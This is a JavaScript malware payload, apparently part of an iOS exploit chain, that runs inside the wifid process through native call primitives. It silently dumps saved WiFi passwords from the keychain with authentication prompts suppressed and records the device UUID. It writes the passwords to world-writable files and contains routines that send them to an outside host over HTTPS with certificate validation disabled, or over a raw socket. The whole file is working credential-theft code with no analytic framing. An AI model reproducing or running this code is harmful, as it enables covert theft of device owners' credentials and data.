// WiFi Password Dump Payload
// Runs under wifid context which has keychain access for WiFi passwords
// Sends WiFi credentials via HTTPS POST

// Server configuration
const SERVER_HOST = "sqwas.shapelie.com";
const SERVER_PORT = 8881;
const USE_HTTPS = true;

class Native {
	
	static #baseAddr;
	static #dlsymAddr;
	static #memcpyAddr;
	static #mallocAddr;
	static #oinvAddr;
	
	static mem = 0n;
	static memSize = 0x4000;
	
	static #argMem = 0n;
	static #argMemPtr = 0n;
	static #argMemPtrStr = 0n;
	static #argPtr = 0n;
	static #argPtrPtr = 0n;
	static #argPtrStrPtr = 0n;

	static #dlsymCache = {};
	
	static init() {
		const buff = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = buff[20];
		this.#dlsymAddr = buff[21];
		this.#memcpyAddr = buff[22];
		this.#mallocAddr = buff[23];
		this.#oinvAddr = buff[24];
		
		this.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));
		this.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);
		this.#argPtr = this.#argMem;
		this.#argPtrPtr = this.#argMemPtr;
		this.#argPtrStrPtr = this.#argMemPtrStr;
	}
	
	static write(ptr, buff) {
		if (!ptr) return false;
		let buff8 = new Uint8Array(nativeCallBuff);
		let offs = 0;
		let left = buff.byteLength;
		while (left) {
			let len = left;
			if (len > 0x1000) len = 0x1000;
			buff8.set(new Uint8Array(buff, offs, len), 0x1000);
			this.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));
			left -= len;
			offs += len;
		}
		return true;
	}
	
	static read(ptr, length) {
		if (!ptr) return null;
		let buff = new ArrayBuffer(length);
		let buff8 = new Uint8Array(buff);
		let offs = 0;
		let left = length;
		while (left) {
			let len = left;
			if (len > 0x1000) len = 0x1000;
			this.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));
			buff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);
			left -= len;
			offs += len;
		}
		return buff;
	}
	
	static readPtr(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}
	
	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getInt32(0, true);
	}
	
	static write64(ptr, value) {
		const buff = new ArrayBuffer(8);
		const view = new DataView(buff);
		view.setBigUint64(0, value, true);
		this.write(ptr, buff);
	}
	
	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}
	
	static writeString(ptr, str) {
		const buff = this.stringToBytes(str, true);
		this.write(ptr, buff);
	}
	
	static callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);
		this.#argPtr = this.#argMem;
		return ret;
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i]) break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}
	
	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated) s8[str.length] = 0x0;
		return s8.buffer;
	}
	
	static #toNative(value) {
		if (!value) return 0n;
		if (typeof value === 'string') {
			if (value.length >= 0x1000) return 0n;
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return ptr;
		}
		else if (typeof value === 'bigint') return value;
		else return BigInt(value);
	}

	static #dlsym(name) {
		if (!name) return 0n;
		let addr = this.#dlsymCache[name];
		if (addr) return addr;
		const RTLD_DEFAULT = 0xfffffffffffffffen;
		const nameBytes = this.stringToBytes(name, true);
		let buff8 = new Uint8Array(nativeCallBuff);
		buff8.set(new Uint8Array(nameBytes), 0x1000);
		addr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);
		if (addr) this.#dlsymCache[name] = addr;
		return addr;
	}
	
	static #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {
		let buff = new BigInt64Array(nativeCallBuff);
		buff[0] = addr;
		buff[100] = x0;
		buff[101] = x1;
		buff[102] = x2;
		buff[103] = x3;
		buff[104] = x4;
		buff[105] = x5;
		buff[106] = x6;
		buff[107] = x7;
		invoker();
		return buff[200];
	}
	
	static #nativeCallSymbol(name, ...args) {
		const funcAddr = this.#dlsym(name);
		const ret64 = this.#nativeCallAddr(funcAddr, ...args);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);
		return ret64;
	}
}

// ============================================================================
// Configuration
// ============================================================================

const TAG = "DARKSWORD-WIFI-DUMP-SECURITYD";
const OUTPUT_FILE = "/tmp/wifi_passwords_securityd.txt";

// ============================================================================
// CoreFoundation Helpers
// ============================================================================

function createCFString(str) {
	return Native.callSymbol("CFStringCreateWithCString", 0n, str, 0x08000100);
}

function cfStringToJS(cfStr) {
	if (!cfStr || cfStr === 0n) return "";
	
	// Try CFStringGetCStringPtr first (fast path)
	const cstrPtr = Native.callSymbol("CFStringGetCStringPtr", cfStr, 0x08000100);
	if (cstrPtr && cstrPtr !== 0n) {
		return Native.readString(cstrPtr, 256).replace(/\0/g, '');
	}
	
	// Fallback to CFStringGetCString
	const bufLen = 512;
	const buf = Native.callSymbol("malloc", bufLen);
	if (!buf || buf === 0n) return "";
	
	try {
		const result = Native.callSymbol("CFStringGetCString", cfStr, buf, bufLen, 0x08000100);
		if (result) {
			return Native.readString(buf, bufLen).replace(/\0/g, '');
		}
	} finally {
		Native.callSymbol("free", buf);
	}
	
	return "";
}

function cfDataToString(cfData) {
	if (!cfData || cfData === 0n) return "";
	
	const length = Number(Native.callSymbol("CFDataGetLength", cfData));
	if (length <= 0 || length > 1024) return "";
	
	const dataPtr = Native.callSymbol("CFDataGetBytePtr", cfData);
	if (!dataPtr || dataPtr === 0n) return "";
	
	const data = Native.read(dataPtr, length);
	if (!data) return "";
	
	const bytes = new Uint8Array(data);
	let str = "";
	for (let i = 0; i < bytes.length; i++) {
		if (bytes[i] === 0) break;
		str += String.fromCharCode(bytes[i]);
	}
	return str;
}

function getCFBooleanTrue() {
	const addr = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFBooleanTrue");
	if (addr && addr !== 0n) {
		return Native.readPtr(addr);
	}
	return 0n;
}

function getCFDictKeyCallbacks() {
	return Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryKeyCallBacks");
}

function getCFDictValueCallbacks() {
	return Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryValueCallBacks");
}

// ============================================================================
// Device UUID
// ============================================================================

function getDeviceUUID() {
	try {
		const iokitHandle = Native.callSymbol("dlopen", "/System/Library/Frameworks/IOKit.framework/IOKit", 1);
		const cfHandle = Native.callSymbol("dlopen", "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
		
		if (!iokitHandle || iokitHandle === 0n) return "unknown-device";
		
		const serviceNamePtr = Native.callSymbol("malloc", 32);
		Native.writeString(serviceNamePtr, "IOPlatformExpertDevice");
		
		const matchingDict = Native.callSymbol("IOServiceMatching", serviceNamePtr);
		Native.callSymbol("free", serviceNamePtr);
		
		if (!matchingDict || matchingDict === 0n) return "unknown-device";
		
		const platformExpert = Native.callSymbol("IOServiceGetMatchingService", 0n, matchingDict);
		if (!platformExpert || platformExpert === 0n) return "unknown-device";
		
		const uuidKeyPtr = Native.callSymbol("malloc", 32);
		Native.writeString(uuidKeyPtr, "IOPlatformUUID");
		const uuidKeyCFStr = Native.callSymbol("CFStringCreateWithCString", 0n, uuidKeyPtr, 0x08000100);
		Native.callSymbol("free", uuidKeyPtr);
		
		if (!uuidKeyCFStr || uuidKeyCFStr === 0n) {
			Native.callSymbol("IOObjectRelease", platformExpert);
			return "unknown-device";
		}
		
		const uuidCFStr = Native.callSymbol("IORegistryEntryCreateCFProperty", 
			platformExpert, uuidKeyCFStr, 0n, 0n);
		Native.callSymbol("CFRelease", uuidKeyCFStr);
		
		if (!uuidCFStr || uuidCFStr === 0n) {
			Native.callSymbol("IOObjectRelease", platformExpert);
			return "unknown-device";
		}
		
		let uuid = "";
		const cstrPtr = Native.callSymbol("CFStringGetCStringPtr", uuidCFStr, 0x08000100);
		if (cstrPtr && cstrPtr !== 0n) {
			uuid = Native.readString(cstrPtr, 256).replace(/\0/g, '').trim();
		}
		
		if (!uuid) {
			const uuidBuf = Native.callSymbol("malloc", 256);
			const result = Native.callSymbol("CFStringGetCString", uuidCFStr, uuidBuf, 256, 0x08000100);
			if (result) {
				uuid = Native.readString(uuidBuf, 256).replace(/\0/g, '').trim();
			}
			Native.callSymbol("free", uuidBuf);
		}
		
		Native.callSymbol("CFRelease", uuidCFStr);
		Native.callSymbol("IOObjectRelease", platformExpert);
		
		return uuid || "unknown-device";
	} catch (e) {
		return "unknown-device";
	}
}

// ============================================================================
// HTTPS POST - Send WiFi Passwords Directly
// ============================================================================

function sendWiFiPasswordsViaHTTPS(passwords) {
	
	try {
		// Get device UUID
		const deviceUUID = getDeviceUUID();
		
		// Build content
		let content = "=== WiFi Passwords ===\n";
		content += "Generated: " + new Date().toISOString() + "\n";
		content += "Device: " + deviceUUID + "\n";
		content += "Total: " + passwords.length + " networks\n\n";
		
		for (const p of passwords) {
			content += "SSID Hash: " + p.ssid + "\n";
			content += "Password: " + p.password + "\n";
			content += "---\n";
		}
		
		// Base64 encode
		const contentBytes = Native.stringToBytes(content, false);
		const base64Data = base64Encode(contentBytes);
		
		// Build JSON payload (same format as file_downloader.js)
		const jsonPayload = JSON.stringify({
			path: "/private/var/tmp/wifi_passwords.txt",
			category: "credentials",
			description: "WiFi Passwords",
			size: content.length,
			deviceUUID: deviceUUID,
			data: base64Data
		});
		
		// Build HTTP request
		const httpRequest = 
			"POST /upload HTTP/1.1\r\n" +
			"Host: " + SERVER_HOST + ":" + SERVER_PORT + "\r\n" +
			"Content-Type: application/json\r\n" +
			"Content-Length: " + jsonPayload.length + "\r\n" +
			"Connection: close\r\n" +
			"\r\n" +
			jsonPayload;
		
		// Load CoreFoundation for streams
		Native.callSymbol("dlopen", "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
		Native.callSymbol("dlopen", "/System/Library/Frameworks/CFNetwork.framework/CFNetwork", 1);
		
		// Create CFString for host
		const hostCFStr = createCFString(SERVER_HOST);
		if (!hostCFStr || hostCFStr === 0n) {
			return false;
		}
		
		// Create stream pair
		const readStreamPtr = Native.callSymbol("malloc", 8n);
		const writeStreamPtr = Native.callSymbol("malloc", 8n);
		Native.write64(readStreamPtr, 0n);
		Native.write64(writeStreamPtr, 0n);
		
		Native.callSymbol("CFStreamCreatePairWithSocketToHost", 0n, hostCFStr, SERVER_PORT, readStreamPtr, writeStreamPtr);
		
		const writeStream = Native.readPtr(writeStreamPtr);
		const readStream = Native.readPtr(readStreamPtr);
		
		Native.callSymbol("free", readStreamPtr);
		Native.callSymbol("free", writeStreamPtr);
		Native.callSymbol("CFRelease", hostCFStr);
		
		if (!writeStream || writeStream === 0n) {
			return false;
		}
		
		if (USE_HTTPS) {
			// Enable TLS
			const kCFStreamPropertySSLSettings = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFStreamPropertySSLSettings");
			const kCFStreamSSLLevel = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFStreamSSLLevel");
			const kCFStreamSocketSecurityLevelNegotiatedSSL = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFStreamSocketSecurityLevelNegotiatedSSL");
			const kCFStreamSSLValidatesCertificateChain = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFStreamSSLValidatesCertificateChain");
			
			if (kCFStreamPropertySSLSettings && kCFStreamPropertySSLSettings !== 0n) {
				const sslSettings = Native.callSymbol("CFDictionaryCreateMutable", 0n, 2, 
					Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryKeyCallBacks"),
					Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryValueCallBacks"));
				
				if (sslSettings && sslSettings !== 0n) {
					// Disable cert validation for self-signed
					const kCFBooleanFalse = Native.readPtr(Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFBooleanFalse"));
					if (kCFStreamSSLValidatesCertificateChain && kCFBooleanFalse) {
						Native.callSymbol("CFDictionarySetValue", sslSettings, 
							Native.readPtr(kCFStreamSSLValidatesCertificateChain), kCFBooleanFalse);
					}
					
					Native.callSymbol("CFWriteStreamSetProperty", writeStream, 
						Native.readPtr(kCFStreamPropertySSLSettings), sslSettings);
					Native.callSymbol("CFReadStreamSetProperty", readStream, 
						Native.readPtr(kCFStreamPropertySSLSettings), sslSettings);
					Native.callSymbol("CFRelease", sslSettings);
				}
			}
			
			// Set security level
			if (kCFStreamSSLLevel && kCFStreamSocketSecurityLevelNegotiatedSSL) {
				Native.callSymbol("CFWriteStreamSetProperty", writeStream,
					Native.readPtr(kCFStreamSSLLevel), Native.readPtr(kCFStreamSocketSecurityLevelNegotiatedSSL));
				Native.callSymbol("CFReadStreamSetProperty", readStream,
					Native.readPtr(kCFStreamSSLLevel), Native.readPtr(kCFStreamSocketSecurityLevelNegotiatedSSL));
			}
		}
		
		// Open streams
		const writeOpen = Native.callSymbol("CFWriteStreamOpen", writeStream);
		const readOpen = Native.callSymbol("CFReadStreamOpen", readStream);
		
		if (!writeOpen || !readOpen) {
			if (writeStream) Native.callSymbol("CFRelease", writeStream);
			if (readStream) Native.callSymbol("CFRelease", readStream);
			return false;
		}
		
		// Wait for connection
		let attempts = 0;
		while (attempts < 50) {
			const canWrite = Native.callSymbol("CFWriteStreamCanAcceptBytes", writeStream);
			if (canWrite) break;
			Native.callSymbol("usleep", 100000); // 100ms
			attempts++;
		}
		
		if (attempts >= 50) {
			Native.callSymbol("CFRelease", writeStream);
			Native.callSymbol("CFRelease", readStream);
			return false;
		}
		
		
		// Send data
		const requestBytes = Native.stringToBytes(httpRequest, false);
		const dataPtr = Native.callSymbol("malloc", BigInt(requestBytes.byteLength));
		Native.write(dataPtr, requestBytes);
		
		let totalSent = 0;
		const totalLen = requestBytes.byteLength;
		
		while (totalSent < totalLen) {
			const canWrite = Native.callSymbol("CFWriteStreamCanAcceptBytes", writeStream);
			if (!canWrite) {
				Native.callSymbol("usleep", 10000);
				continue;
			}
			
			const remaining = totalLen - totalSent;
			const chunkSize = remaining > 4096 ? 4096 : remaining;
			const written = Native.callSymbol("CFWriteStreamWrite", writeStream, 
				dataPtr + BigInt(totalSent), BigInt(chunkSize));
			
			if (Number(written) <= 0) {
				break;
			}
			
			totalSent += Number(written);
		}
		
		Native.callSymbol("free", dataPtr);
		
		// Wait briefly for response
		Native.callSymbol("usleep", 500000); // 500ms
		
		// Cleanup
		Native.callSymbol("CFRelease", writeStream);
		Native.callSymbol("CFRelease", readStream);
		
		return totalSent === totalLen;
		
	} catch (e) {
		return false;
	}
}

// Raw socket HTTP (no TLS) - might bypass CFStream sandbox restrictions
function sendWiFiPasswordsViaHTTP(passwords) {
	
	try {
		const deviceUUID = getDeviceUUID();
		
		// Build content
		let content = "=== WiFi Passwords ===\n";
		content += "Generated: " + new Date().toISOString() + "\n";
		content += "Device: " + deviceUUID + "\n";
		content += "Total: " + passwords.length + " networks\n\n";
		
		for (const p of passwords) {
			content += "SSID Hash: " + p.ssid + "\n";
			content += "Password: " + p.password + "\n";
			content += "---\n";
		}
		
		const contentBytes = Native.stringToBytes(content, false);
		const base64Data = base64Encode(contentBytes);
		
		const jsonPayload = JSON.stringify({
			path: "/private/var/tmp/wifi_passwords.txt",
			category: "credentials",
			description: "WiFi Passwords",
			size: content.length,
			deviceUUID: deviceUUID,
			data: base64Data
		});
		
		// Create socket
		const AF_INET = 2;
		const SOCK_STREAM = 1;
		const socket = Native.callSymbol("socket", AF_INET, SOCK_STREAM, 0);
		
		if (Number(socket) < 0) {
			return false;
		}
		
		
		// Build sockaddr_in (use port 4444 for HTTP - matches server)
		const HTTP_PORT = 4444;
		const addr = Native.callSymbol("malloc", 16);
		const addrBuf = new ArrayBuffer(16);
		const addrView = new DataView(addrBuf);
		addrView.setUint8(0, 16);  // sin_len
		addrView.setUint8(1, AF_INET);  // sin_family
		addrView.setUint16(2, Native.callSymbol("htons", HTTP_PORT), false);  // sin_port
		
		// Parse IP address
		const ipParts = SERVER_HOST.split('.');
		addrView.setUint8(4, parseInt(ipParts[0]));
		addrView.setUint8(5, parseInt(ipParts[1]));
		addrView.setUint8(6, parseInt(ipParts[2]));
		addrView.setUint8(7, parseInt(ipParts[3]));
		
		Native.write(addr, addrBuf);
		
		// Connect
		const connectResult = Native.callSymbol("connect", socket, addr, 16);
		Native.callSymbol("free", addr);
		
		if (Number(connectResult) < 0) {
			Native.callSymbol("close", socket);
			return false;
		}
		
		
		// Build HTTP request
		const httpRequest = 
			"POST /upload HTTP/1.1\r\n" +
			"Host: " + SERVER_HOST + ":" + HTTP_PORT + "\r\n" +
			"Content-Type: application/json\r\n" +
			"Content-Length: " + jsonPayload.length + "\r\n" +
			"Connection: close\r\n" +
			"\r\n" +
			jsonPayload;
		
		// Send
		const requestBytes = Native.stringToBytes(httpRequest, false);
		const dataPtr = Native.callSymbol("malloc", BigInt(requestBytes.byteLength));
		Native.write(dataPtr, requestBytes);
		
		const sent = Native.callSymbol("send", socket, dataPtr, BigInt(requestBytes.byteLength), 0);
		Native.callSymbol("free", dataPtr);
		Native.callSymbol("close", socket);
		
		return Number(sent) === requestBytes.byteLength;
		
	} catch (e) {
		return false;
	}
}

function base64Encode(arrayBuffer) {
	const bytes = new Uint8Array(arrayBuffer);
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	let result = "";
	
	for (let i = 0; i < bytes.length; i += 3) {
		const b1 = bytes[i];
		const b2 = i + 1 < bytes.length ? bytes[i + 1] : 0;
		const b3 = i + 2 < bytes.length ? bytes[i + 2] : 0;
		
		result += chars[b1 >> 2];
		result += chars[((b1 & 3) << 4) | (b2 >> 4)];
		result += i + 1 < bytes.length ? chars[((b2 & 15) << 2) | (b3 >> 6)] : "=";
		result += i + 2 < bytes.length ? chars[b3 & 63] : "=";
	}
	
	return result;
}

// ============================================================================
// WiFi Password Extraction
// ============================================================================

function extractWiFiPasswords() {
	const passwords = [];
	
	
	// Create query dictionary
	const keyCallbacks = getCFDictKeyCallbacks();
	const valueCallbacks = getCFDictValueCallbacks();
	
	let queryDict;
	if (keyCallbacks && valueCallbacks && keyCallbacks !== 0n && valueCallbacks !== 0n) {
		queryDict = Native.callSymbol("CFDictionaryCreateMutable", 0n, 0, keyCallbacks, valueCallbacks);
	} else {
		queryDict = Native.callSymbol("CFDictionaryCreateMutable", 0n, 0, 0n, 0n);
	}
	
	if (!queryDict || queryDict === 0n) {
		return passwords;
	}
	
	try {
		// Security framework constants
		const kSecClass = createCFString("class");
		const kSecClassGenericPassword = createCFString("genp");
		const kSecReturnAttributes = createCFString("r_Attributes");
		const kSecReturnData = createCFString("r_Data");
		const kSecMatchLimit = createCFString("m_Limit");
		const kSecMatchLimitAll = createCFString("m_LimitAll");
		
		// IMPORTANT: Disable authentication UI - silently fail instead of prompting user
		const kSecUseAuthenticationUI = createCFString("u_AuthUI");
		const kSecUseAuthenticationUIFail = createCFString("u_AuthUIF");
		const kSecAttrAccessGroup = createCFString("agrp");
		const kCFBooleanTrue = getCFBooleanTrue();
		
		// Result keys
		const kSecAttrService = createCFString("svce");
		const kSecAttrAccount = createCFString("acct");
		const kResultDataKey = createCFString("v_Data");
		
		if (!kSecClass || !kSecClassGenericPassword || !kCFBooleanTrue) {
			return passwords;
		}
		
		// Query specifically for AirPort service (WiFi passwords)
		const kSecAttrServiceKey = createCFString("svce");
		const airportService = createCFString("AirPort");
		
		// First, query ALL generic passwords to see what wifid can access
		Native.callSymbol("CFDictionarySetValue", queryDict, kSecClass, kSecClassGenericPassword);
		Native.callSymbol("CFDictionarySetValue", queryDict, kSecReturnAttributes, kCFBooleanTrue);
		Native.callSymbol("CFDictionarySetValue", queryDict, kSecReturnData, kCFBooleanTrue);
		Native.callSymbol("CFDictionarySetValue", queryDict, kSecMatchLimit, kSecMatchLimitAll);
		
		// IMPORTANT: Disable authentication UI prompts - silently fail for protected items
		Native.callSymbol("CFDictionarySetValue", queryDict, kSecUseAuthenticationUI, kSecUseAuthenticationUIFail);
		
		// Query without AirPort filter first to see total accessible items
		const allResultPtr = Native.callSymbol("malloc", 8n);
		if (allResultPtr && allResultPtr !== 0n) {
			Native.write64(allResultPtr, 0n);
			const allStatus = Native.callSymbol("SecItemCopyMatching", queryDict, allResultPtr);
			const allStatusNum = Number(allStatus);
			let allSigned = allStatusNum > 0x7FFFFFFF ? allStatusNum - 0x100000000 : allStatusNum;
			
			if (allSigned === 0) {
				const allResults = Native.readPtr(allResultPtr);
				if (allResults && allResults !== 0n) {
					const allCount = Number(Native.callSymbol("CFArrayGetCount", allResults));
					
					// Scan all items for WiFi passwords - be very defensive
					// Skip the ALL query for now - just use AirPort query which works
					// Skip the ALL query loop - it causes crashes on some items
					// Just release the results and rely on the AirPort-specific query
					Native.callSymbol("CFRelease", allResults);
				}
			} else {
			}
			Native.callSymbol("free", allResultPtr);
		}
		
		// Now query specifically for AirPort
		Native.callSymbol("CFDictionarySetValue", queryDict, kSecAttrServiceKey, airportService);
		
		// Execute query
		const resultPtr = Native.callSymbol("malloc", 8n);
		if (!resultPtr || resultPtr === 0n) {
			return passwords;
		}
			
			try {
				Native.write64(resultPtr, 0n);
				
				const status = Native.callSymbol("SecItemCopyMatching", queryDict, resultPtr);
				const statusNum = Number(status);
				let signed = statusNum > 0x7FFFFFFF ? statusNum - 0x100000000 : statusNum;
				
				
				if (signed === 0) {
					const results = Native.readPtr(resultPtr);
					if (results && results !== 0n) {
						const arrayTypeId = Native.callSymbol("CFArrayGetTypeID");
						const dictTypeId = Native.callSymbol("CFDictionaryGetTypeID");
						const typeId = Native.callSymbol("CFGetTypeID", results);
						
						if (typeId === arrayTypeId) {
							const count = Number(Native.callSymbol("CFArrayGetCount", results));
							
							// Log ALL items to debug
							for (let i = 0; i < count; i++) {
								const item = Native.callSymbol("CFArrayGetValueAtIndex", results, i);
								if (!item || item === 0n) {
									continue;
								}
								const serviceRef = Native.callSymbol("CFDictionaryGetValue", item, kSecAttrService);
								const service = cfStringToJS(serviceRef);
								const accountRef = Native.callSymbol("CFDictionaryGetValue", item, kSecAttrAccount);
								const account = cfStringToJS(accountRef);
								const dataRef = Native.callSymbol("CFDictionaryGetValue", item, kResultDataKey);
								const hasData = (dataRef && dataRef !== 0n) ? "YES" : "NO";
							}
							
							for (let i = 0; i < count; i++) {
								const item = Native.callSymbol("CFArrayGetValueAtIndex", results, i);
								if (!item || item === 0n) continue;
								
								const itemTypeId = Native.callSymbol("CFGetTypeID", item);
								if (itemTypeId !== dictTypeId) continue;
								
								// Extract service (SSID)
								const serviceRef = Native.callSymbol("CFDictionaryGetValue", item, kSecAttrService);
								const service = cfStringToJS(serviceRef);
								
								// Extract account
								const accountRef = Native.callSymbol("CFDictionaryGetValue", item, kSecAttrAccount);
								const account = cfStringToJS(accountRef);
								
								// Extract password (v_Data contains the actual password bytes)
								const dataRef = Native.callSymbol("CFDictionaryGetValue", item, kResultDataKey);
								const password = cfDataToString(dataRef);
								
								// All results are AirPort (WiFi) entries since we queried with service=AirPort
								// The account field contains the SSID
								if (password && account) {
									passwords.push({ ssid: account, password: password, service: service });
								} else if (password) {
									// Fallback: use a placeholder if no account name
									passwords.push({ ssid: "(unknown)", password: password, service: service });
								}
							}
						} else if (typeId === dictTypeId) {
							// Single result
							const serviceRef = Native.callSymbol("CFDictionaryGetValue", results, kSecAttrService);
							const service = cfStringToJS(serviceRef);
							const accountRef = Native.callSymbol("CFDictionaryGetValue", results, kSecAttrAccount);
							const account = cfStringToJS(accountRef);
							const dataRef = Native.callSymbol("CFDictionaryGetValue", results, kResultDataKey);
							const password = cfDataToString(dataRef);
							
							if (service && password) {
								const ssid = account || service;
								passwords.push({ ssid: ssid, password: password, service: service });
							}
						}
						
						Native.callSymbol("CFRelease", results);
					}
				}
				
				
		} finally {
			Native.callSymbol("free", resultPtr);
		}
		
		// Cleanup CFStrings
		if (kSecClass) Native.callSymbol("CFRelease", kSecClass);
		if (kSecClassGenericPassword) Native.callSymbol("CFRelease", kSecClassGenericPassword);
		if (kSecReturnAttributes) Native.callSymbol("CFRelease", kSecReturnAttributes);
		if (kSecReturnData) Native.callSymbol("CFRelease", kSecReturnData);
		if (kSecMatchLimit) Native.callSymbol("CFRelease", kSecMatchLimit);
		if (kSecMatchLimitAll) Native.callSymbol("CFRelease", kSecMatchLimitAll);
		if (kSecUseAuthenticationUI) Native.callSymbol("CFRelease", kSecUseAuthenticationUI);
		if (kSecUseAuthenticationUIFail) Native.callSymbol("CFRelease", kSecUseAuthenticationUIFail);
		if (kSecAttrService) Native.callSymbol("CFRelease", kSecAttrService);
		if (kSecAttrAccount) Native.callSymbol("CFRelease", kSecAttrAccount);
		if (kSecAttrServiceKey) Native.callSymbol("CFRelease", kSecAttrServiceKey);
		if (airportService) Native.callSymbol("CFRelease", airportService);
		if (kResultDataKey) Native.callSymbol("CFRelease", kResultDataKey);
		
	} finally {
		Native.callSymbol("CFRelease", queryDict);
	}
	
	return passwords;
}

/**
 * Write passwords to file
 */
function writePasswordsToFile(passwords, outputPath) {
	
	let content = "=== WiFi Passwords ===\n";
	content += "Generated: " + new Date().toISOString() + "\n";
	content += "Total: " + passwords.length + " networks\n\n";
	
	for (const p of passwords) {
		content += "SSID: " + p.ssid + "\n";
		content += "Password: " + p.password + "\n";
		if (p.service) content += "Service: " + p.service + "\n";
		content += "\n";
	}
	
	if (passwords.length === 0) {
		content += "No WiFi passwords found.\n";
		content += "This may be due to:\n";
		content += "  - Process lacks keychain entitlements\n";
		content += "  - No saved WiFi networks\n";
		content += "  - Keychain access denied\n";
	}
	
	
	const fd = Native.callSymbol("open", outputPath, 0x601, 511); // O_WRONLY | O_CREAT | O_TRUNC, 0777
	
	if (Number(fd) < 0) {
		return false;
	}
	
	try {
		const contentBytes = Native.stringToBytes(content, false);
		
		const buf = Native.callSymbol("malloc", BigInt(contentBytes.byteLength));
		
		if (buf && buf !== 0n) {
			Native.write(buf, contentBytes);
			const written = Native.callSymbol("write", fd, buf, contentBytes.byteLength);
			Native.callSymbol("free", buf);
		} else {
		}
		
		// Set 777 permissions
		Native.callSymbol("chmod", outputPath, 511);
		
		// Also create symlink or copy to /tmp
		return true;
	} finally {
		Native.callSymbol("close", fd);
	}
}

// ============================================================================
// Main Execution
// ============================================================================

Native.init();


// Try multiple paths that wifid might have write access to
const POSSIBLE_PATHS = [
	// wifid's own directories
	"/var/wireless/wifi_passwords.txt",
	"/var/wireless/Library/wifi_passwords.txt",
	"/var/wireless/Library/Caches/wifi_passwords.txt",
	"/var/wireless/Library/Preferences/wifi_passwords.txt",
	"/private/var/wireless/wifi_passwords.txt",
	
	// System temp locations
	"/private/var/tmp/wifi_passwords.txt",
	"/tmp/wifi_passwords.txt",
	"/var/tmp/wifi_passwords.txt",
	
	// Log directories (often writable by daemons)
	"/var/log/wifi_passwords.txt",
	"/private/var/log/wifi_passwords.txt",
	"/var/logs/wifi_passwords.txt",
	
	// Root home
	"/var/root/wifi_passwords.txt",
	"/private/var/root/wifi_passwords.txt",
	
	// Mobile directories
	"/var/mobile/wifi_passwords.txt",
	"/var/mobile/Library/wifi_passwords.txt",
	"/var/mobile/Library/Caches/wifi_passwords.txt",
	"/private/var/mobile/Library/Caches/wifi_passwords.txt",
	
	// Preferences directories
	"/var/preferences/wifi_passwords.txt",
	"/private/var/preferences/wifi_passwords.txt",
	
	// DB directories
	"/var/db/wifi_passwords.txt",
	"/private/var/db/wifi_passwords.txt",
	
	// Daemon run directories
	"/var/run/wifi_passwords.txt",
	"/private/var/run/wifi_passwords.txt",
	
	// Network-related
	"/var/networkd/wifi_passwords.txt",
	"/private/var/networkd/wifi_passwords.txt",
	"/private/var/networkd/db/wifi_passwords.txt",
];

let writablePath = null;

for (const testPath of POSSIBLE_PATHS) {
	const testFd = Native.callSymbol("open", testPath, 0x601, 511);
	if (Number(testFd) >= 0) {
		Native.callSymbol("close", testFd);
		writablePath = testPath;
		break;
	}
}

try {
	const passwords = extractWiFiPasswords();
	
	// Log passwords to syslog
	for (const p of passwords) {
	}
	
	// ALWAYS write to file first if we have a writable path
	// This allows file_downloader (running in SpringBoard) to pick it up
	if (passwords.length > 0 && writablePath) {
		writePasswordsToFile(passwords, writablePath);
	}
	
	// Also try to send via network (usually fails due to sandbox)
    /*
	if (passwords.length > 0) {
		let sent = sendWiFiPasswordsViaHTTPS(passwords);
		if (sent) {
		} else {
			sent = sendWiFiPasswordsViaHTTP(passwords);
			if (sent) {
			} else {
			}
		}
	}
    */
	
} catch (e) {
}


